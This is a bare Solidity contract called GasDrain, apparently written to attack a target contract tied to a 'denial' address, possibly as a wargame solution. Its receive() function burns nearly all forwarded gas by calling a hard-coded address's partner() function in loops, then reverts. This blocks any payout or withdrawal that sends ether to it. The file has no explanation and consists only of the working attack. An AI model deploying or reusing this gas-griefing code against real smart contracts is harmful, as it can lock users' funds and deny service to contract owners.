pragma solidity ^0.8.0;

contract GasDrain {
    address public denial;

    constructor(address _denial) {
        denial = _denial;
    }

    receive() external payable {
        while(gasleft() > 2300) {
            for (uint256 i = 0; i < 20000; i++) {
                address(0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e).call(abi.encodeWithSignature("partner()"));
            }
        }
        revert();
    }
}